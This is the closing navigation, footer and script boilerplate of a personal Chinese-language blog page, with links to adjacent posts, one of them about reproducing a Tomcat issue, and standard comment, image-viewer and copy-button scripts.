icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/articles/2023/07/20/tomcat%E5%A4%8D%E7%8E%B0/" title="tomcat复现"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul><div class="copyright"><div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!0,appId:"yCi6g1FoJhBaWWsmJrysnhSM-gzGzoHsz",appKey:"okzCVsRtNdmyQDW34mMUxKOr",placeholder:"留言",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText,n=(e+="\n/**\n* 感谢您复制代码，使用代码请注明引用出处\n* j3fffff @ https://j3f5.github.io\n*/",document.createElement("textarea")),e=(document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus(),document.execCommand("copy"));document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>